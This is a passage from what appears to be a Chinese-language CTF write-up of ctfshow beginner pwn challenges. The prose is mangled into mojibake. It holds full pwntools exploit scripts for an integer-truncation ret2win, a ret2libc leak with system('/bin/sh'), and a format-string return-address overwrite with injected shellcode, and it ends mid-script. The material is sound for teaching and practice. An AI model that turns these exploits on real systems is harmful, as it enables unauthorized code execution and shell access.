<p>è·Ÿè¿›åˆ°check_passwdå‡½æ•°å‘ç°<code>unsigned __int8 v3;</code>v3èŒƒå›´æ˜¯<code>0 ~ 255</code>ï¼Œè¶…è¿‡äº†255å°±ä¼šè¢«æˆªæ–­ä¸”<code>if ( v3 &gt; 3u &amp;&amp; v3 &lt;= 8u )</code>åªä¼šçœ‹æˆªæ–­å‡ºçš„é‚£éƒ¨åˆ†é•¿åº¦ï¼Œæ¥ç€sè¢«èµ‹å€¼ç»™åˆ°destï¼Œæ­¤æ—¶så…ˆå‰çš„è¢«æˆªæ–­å¿½ç•¥æ‰çš„é‚£<code>0 ~ 255</code>é‚£éƒ¨åˆ†åœ¨è¿™é‡Œè¿˜æ˜¯æœ‰æ„ä¹‰çš„ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span><span class="s2">&#34;debug&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28133</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">getshell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;fffflag&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice:&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Please input your username:&#34;</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;Expl0rer-Ct&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x14</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">getshell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x104</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Please input your passwd:&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯¹äºpayloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x14</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">getshell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x104</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ï¼ˆ0x14+4ï¼‰æ ˆæº¢å‡ºåˆ°è¿”å›åœ°å€éœ€è¦å¡«å……çš„åƒåœ¾å€¼å¤§å°ï¼Œgetshellæ˜¯åé—¨å‡½æ•°çš„åœ°å€ï¼Œæ¥ç€åœ¨æ­¤é•¿åº¦åŸºç¡€ä¸Šè¡¥å…¨åˆ°0x104é•¿åº¦å¤§å°ï¼Œ0x104è½¬æ¢ä¸ºåè¿›åˆ¶å°±æ˜¯260ï¼Œåœ¨æˆªæ–­åå˜æˆ<code>4</code>ï¼Œæ­£å¥½é€šè¿‡ifåˆ¤æ–­è¯­å¥çš„æ£€æŸ¥ã€‚</p>
<h3 id="pwn_107">PWN_107
</h3><p>é¢˜ç›®ï¼šç±»å‹è½¬æ¢ã€‚</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/381.png"
	width="909"
	height="205"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/381_hu_143214096ef4fc5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/381_hu_49fae2c5593ef738.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="443"
		data-flex-basis="1064px"
	
></p>
<p>32ä½å…³é—­Canaryå’ŒPIEä¿æŠ¤ã€‚</p>
<p>IDA32ä½åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/382.png"
	width="930"
	height="291"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/382_hu_e6817f90e0160475.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/382_hu_1868ff19bba7b4b7.png 1024w"
	loading="lazy"
	
		alt="showå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="767px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/383.png"
	width="640"
	height="394"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/383_hu_da858c314f5038cf.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/383_hu_4ad5099d6e7382e1.png 1024w"
	loading="lazy"
	
		alt="getchå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="162"
		data-flex-basis="389px"
	
></p>
<p>showå‡½æ•°ä¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æ•°æ®å¹¶å°†å…¶å­˜å‚¨è¿›ï¼ˆintç±»å‹ï¼‰<code>nptr</code>ï¼Œç„¶åä»£å…¥getchå‡½æ•°å†…çš„å‚æ•°ã€‚<code>v2 = atoi(nptr);</code>æ˜¯å°†å­—ç¬¦ä¸² nptr è½¬æ¢ä¸ºæ•´æ•°ï¼Œå¹¶èµ‹å€¼ç»™å˜é‡v2ï¼Œä½†åœ¨getchå‡½æ•°è·Ÿè¿›åå‘ç°ï¼šv2ä»£å…¥ç»™a2ï¼Œä½†åœ¨getchå‡½æ•°å†…ï¼Œa2æ˜¯æ— ç¬¦å·ç±»å‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¾“å…¥è´Ÿæ•°å¯ä»¥è¾¾åˆ°æ•´æ•°æº¢å‡ºçš„æ•ˆæœäº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/384.png"
	width="1111"
	height="95"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/384_hu_c39f119a61cb70c1.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/384_hu_4aadafcb4d0f094d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1169"
		data-flex-basis="2806px"
	
></p>
<p>æ­¤æ—¶v2å‡ºæ¥åå°±æ˜¯å¾ˆå¤§çš„ä¸€ä¸ªæ•´æ•°ï¼Œ<code>getch((int)nptr, v2);</code>å°±èƒ½è¯»å–å¾ˆå¤§é•¿åº¦çš„å€¼ç»™npträº†ï¼Œè¿™å°±èƒ½æ¥ç»­åé¢çš„æ ˆæº¢å‡ºäº†ã€‚</p>
<p>å¤§è‡´æ€è·¯ï¼š</p>
<ol>
<li>è¾“å…¥è´Ÿæ•°è¶…å‡ºé•¿åº¦é™åˆ¶ï¼Œä¸ºåç»­æ ˆæº¢å‡ºæ‰“ä¸‹åŸºç¡€ï¼›</li>
<li>æ³„éœ²printfçš„çœŸå®å‡½æ•°ï¼Œå†åˆ©ç”¨<code>LibcSearcher</code>æ¨¡å—æŸ¥æ‰¾åˆ°libcç‰ˆæœ¬ï¼›</li>
<li>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæ³„éœ²äº†printfåœ°å€ï¼Œè€Œä¸”æœ‰printfçš„å†è¿™ä¸ªlibcç‰ˆæœ¬ä¸‹çš„åç§»é‡ï¼Œåæ¨å‡ºç¨‹åºçš„åŸºåœ°å€ï¼Œè¿›è€Œèƒ½åæ¨å‡ºæˆ‘ä»¬getshellæ‰€éœ€çš„å‡½æ•°æ¯”å¦‚<code>system</code>å‡½æ•°ã€<code>/bin/sh</code>å­—ç¬¦ä¸²ç­‰ï¼›</li>
<li>ç¼–å†™payloadï¼Œæº¢å‡ºè¦†ç›–è¿”å›åœ°å€å»æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;);</code>ã€‚</li>
</ol>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28163</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How many bytes do you want me to read? &#34;</span><span class="p">,</span> <span class="s1">&#39;-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x2C</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;bytes of data!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;printf_real_address is </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;printf&#34;</span><span class="p">,</span><span class="n">printf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;printf&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x2C</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How many bytes do you want me to read? &#34;</span><span class="p">,</span> <span class="s1">&#39;-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_108å¾…å®š">PWN_108ï¼ˆå¾…å®šï¼‰
</h3><p>é¢˜ç›®ï¼šå­¦ç´¯äº†å§ï¼Œæ¥ç©ä¸ªæ¸¸æˆã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/385.png"
	width="816"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/385_hu_d0c79772681b2abb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/385_hu_e53ce205d825bfdf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="408"
		data-flex-basis="979px"
	
></p>
<p>64ä½ä¿æŠ¤å…¨å¼€ã€‚</p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/443.png"
	width="826"
	height="624"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/443_hu_2b11c634df93c300.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/443_hu_d3ee8642407a63dd.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="132"
		data-flex-basis="317px"
	
></p>
<p>åœ¨mainå‡½æ•°ä¸­ï¼Œæœ‰æ³„éœ²putsçœŸå®åœ°å€ï¼Œè¿™èƒ½ç®—å‡ºlibcåŸºå€ï¼ˆlibc_baseï¼‰ï¼Œ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/444.png"
	width="1135"
	height="151"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/444_hu_22c779596658a50c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/444_hu_67f252d7997f9974.png 1024w"
	loading="lazy"
	
		alt="checkå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="751"
		data-flex-basis="1803px"
	
></p>
<p>ä¸å…è®¸æ•°ç»„çš„å‰ä¸¤ä¸ªå…ƒç´ åŒæ—¶ä¸º 0xc5 å’Œ 0xf2 ï¼Œæˆ–è€… 0x22 å’Œ 0xf3 ï¼Œæˆ–è€… 0x8c å’Œ 0xa3ã€‚</p>
<h3 id="pwn_109fmt">PWN_109ï¼ˆFMTï¼‰
</h3><p>é¢˜ç›®ï¼šå¤šç§å§¿åŠ¿ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/394.png"
	width="785"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/394_hu_93a31e3c82a0d1f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/394_hu_4e2950626e45d45.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="341"
		data-flex-basis="819px"
	
></p>
<p>32ä½å…³é—­Canaryä¸NXæœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œçš„æ®µã€‚</p>
<p>é‚£å°±å¯ä»¥å°è¯•æ³¨å…¥shellcodeã€‚</p>
<p>IDA64åˆ†æä¸€ç•ªã€ç»™å‡½æ•°è®°åï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/395.png"
	width="970"
	height="605"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/395_hu_ba78bc19feda3069.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/395_hu_e931727cb1aa3463.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="160"
		data-flex-basis="384px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/396.png"
	width="779"
	height="99"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/396_hu_273cb7a2fc263d8d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/396_hu_fa8dcce8f205a9a8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="786"
		data-flex-basis="1888px"
	
></p>
<p>å¯ä»¥å‘ç°è¿™æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/397.png"
	width="835"
	height="120"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/397_hu_c59313edfe821625.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/397_hu_79ab217adbe329d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="695"
		data-flex-basis="1670px"
	
></p>
<p>æ¥ç€è¿™é‡Œåˆæ³„éœ²äº†bufæ ˆåœ°å€ã€‚</p>
<p>æ¥æ”¶äº†æ ˆåœ°å€åï¼Œæ¨å‡ºäº†retè¿”å›åœ°å€ï¼ˆret+0x408+0x4ï¼Œä¹Ÿå°±æ˜¯<strong>ret+0x40C</strong>ï¼‰åº”è¯¥åˆ©ç”¨<strong>payload_fmtstr</strong>å‡½æ•°å»ä¿®æ”¹è¿”å›åœ°å€ï¼Œexp1ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;pwn.challenge.ctf.show&#39;,28106)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">+</span> <span class="mh">0x40C</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">16</span><span class="p">,{</span><span class="n">ret</span><span class="p">:</span><span class="n">stack</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯æ˜¯ä¸€ç›´æŠ¥é”™ï¼Œåº”è¯¥æ˜¯ç¼“å†²åŒºå¤§å°é”™æˆ–è€…åœ°å€å‡ºé”™ï¼Œä¸Šgdbè°ƒè¯•ä¸€ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;pwn.challenge.ctf.show&#39;,28106)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Quit!!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;stack_address--&gt;&#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">+</span> <span class="mh">0x40C</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;ret_address--&gt;&#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">16</span><span class="p">,{</span><span class="n">ret</span><span class="p">:</span><span class="n">stack</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
